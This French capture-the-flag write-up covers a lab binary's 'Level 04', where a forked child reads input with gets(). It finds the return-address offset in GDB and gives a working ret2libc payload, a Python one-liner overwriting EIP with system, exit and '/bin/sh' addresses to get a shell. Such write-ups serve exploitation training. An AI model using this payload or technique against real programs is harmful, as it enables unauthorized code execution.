## Level 04

### Analyse
L'analyse du binaire via GDB montre que le programme se duplique avec fork(). Le processus enfant utilise la fonction vulnérable gets(), tandis que le parent surveille l'enfant via ptrace. L'objectif est de corrompre la pile de l'enfant pour rediriger l'exécution vers la libc.

La faille se situe dans le processus enfant (quand le retour de fork est 0):
```bash
0x080486d6 <+14>:    call   0x8048550 <fork@plt>
0x080486db <+19>:    mov    %eax,0xac(%esp) ; Stocke le PID
...
0x08048711 <+73>:    jne    0x8048769 <main+161> ; Si PID != 0, va au Parent
...
0x08048757 <+143>:   lea    0x20(%esp),%eax ; Buffer enfant
0x0804875e <+150>:   call   0x80484b0 <gets@plt> ; Faille Buffer Overflow
```

On configure GDB pour suivre l'enfant et on injecte un pattern pour trouver l'offset de l'EIP:
```bash
(gdb) set follow-fork-mode child
(gdb) r < <(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")

Program received signal SIGSEGV, Segmentation fault.
0x41326641 in ?? ()
```
L'adresse 0x41326641 correspond à l'offset 156.

### Exploitation

Le parent utilise ptrace pour interdire les syscalls (comme execve). On contourne cette restriction en utilisant une attaque Ret2Libc pour appeler system("/bin/sh") déjà présent en mémoire.
On récupère les adresses nécessaires dans la libc :
1. system : 0xf7e6aed0
2. exit : 0xf7e5eb70
3. /bin/sh : 0xf7f897ec

```bash
(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04
```
Le payload écrase l'EIP avec l'adresse de system, suivi de exit (pour une sortie propre) et du pointeur vers la string "/bin/sh".
